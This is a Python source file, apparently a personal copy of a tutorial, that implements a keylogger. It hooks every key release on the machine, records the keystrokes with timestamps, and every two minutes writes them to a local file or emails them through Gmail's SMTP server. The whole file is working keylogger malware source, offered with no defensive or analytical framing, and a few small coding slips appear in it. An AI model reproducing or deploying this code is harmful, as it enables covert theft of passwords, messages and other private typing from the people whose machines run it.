from code import InteractiveConsole
from tracemalloc import start
import keyboard # for keylogs
import smtplib #for sending email using SMTP protocol (gmail)


from threading import Timer
from datetime import datetime
import os
os.chdir("C:/Users/hp/Desktop/keylogger")
print('path:', os.getcwd())
SEND_REPORT_EVERY = 120 # in seconds,60 seconds = 1 minutes
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""


class Keylogger:
    def __init__(self, interval, report_method = "email"):
        # we want to pass and SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within self.interval
        self.log = ""
        # record start and end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """"
        This callback is invoked whenenever a keyboard is occured (i.e when is  released in this example)
        """

        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER  is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = " . "
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        # finally, add the key name to our global "self.log" variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start and end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":","")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        
    def report_to_file(self):
        """ This  method creates a log file in the current directory that contains the current keylog in the 'self.log' variable """

        # open the file in write in write mode(create it)
        with open(f"[+] saved  {self.filename}.txt", "w") as f:
        # write the keylogs to the file
            print(self.log, file = f )
        print(f"[+] saved {self.filename}.txt")


    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host ="smtp.gmail.com", port = 587)
        # connect to SMTP server as TLS  mode (for security)
        server.starttls()
        # login to the email account
        server.login(email, password)
        # sent the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """ this funcyion gets called 'self.interval' it basically sends keylogs and resets 'self.log' variable """
        if self.log:
        # if there is something in log, report it
         self.end_dt = datetime.now()
        # update  self.filename
        self.update_filename()
        if self.report_method == "email":
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD,self.log)
        elif self.report_method == "file":
            self.report_to_file()
        # if you want to print in the console, uncomment below line
        print(f"[{self.filename}] - {self.log}")
        self.log = ""
        timer = Timer(interval = self.interval, function = self.report)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start dattimetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback = self.callback)
        #start reporting the keylogs
        self.report()
        #make a simple message
        print(f"{datetime.now()} - start keylogger")
        # block the current thread. wait until CLRL is pressed
        keyboard.wait()


if __name__ == "__main__":
    # if you want a keylogger to send to your email
    #keylogger = keylogger(interval = SEND_REPORT_EVERY, report_methods = "email")
    # if you want a keyloader a record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval = SEND_REPORT_EVERY, report_method = "file")
    keylogger.start()



        